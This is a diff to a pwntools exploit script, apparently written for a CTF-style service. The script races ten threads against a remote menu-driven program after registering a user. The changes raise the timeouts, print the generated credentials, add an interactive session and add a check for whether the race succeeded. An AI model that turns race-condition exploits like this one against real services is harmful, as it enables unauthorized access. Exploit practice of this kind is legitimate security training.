@@ -5,6 +5,7 @@ from pwn import *
 import threading
 import sys
 import string
+import time
 
 alph = string.ascii_lowercase + string.ascii_uppercase
 
@@ -65,9 +66,11 @@ if __name__ == "__main__":
 		sys.exit( 1 )
 
 	threads = []
-	s = remote( g_host, PORT, timeout=3 )
-	s.settimeout( 3 )
-	reg_user( s, idg(), idg() )
+	s = remote( g_host, PORT, timeout=15 )
+	s.settimeout( 15 )
+	username, password =  idg(), idg()
+	print( username, password )
+	reg_user( s, username, password )
 
 	for i in range( 10 ):
 		wrk = threading.Thread( target=race_worker )
@@ -79,10 +82,8 @@ if __name__ == "__main__":
 	s.send( "\n5\n" )
 	s.recv()
 	s.send( "0\n" )
-	
-	while s.recv():
-		pass
 
+	s.interactive()
 	s.send( b"2\n" )
 	s.recvuntil( b"> " )
 	s.send( b"4\n" )
@@ -91,6 +92,12 @@ if __name__ == "__main__":
 	s.recvuntil( b"> " )
 	
 	s.send( b"3\n" )
+	data = s.recvline()
+	print( data )
+	if b"have" in data:
+		print( "race not worked!" )
+		sys.exit( -1 )
+
 	s.recvuntil( b"id: " )
 	s.send( b"0\n" )
 	s.recvuntil( b"[y\\n]: " )
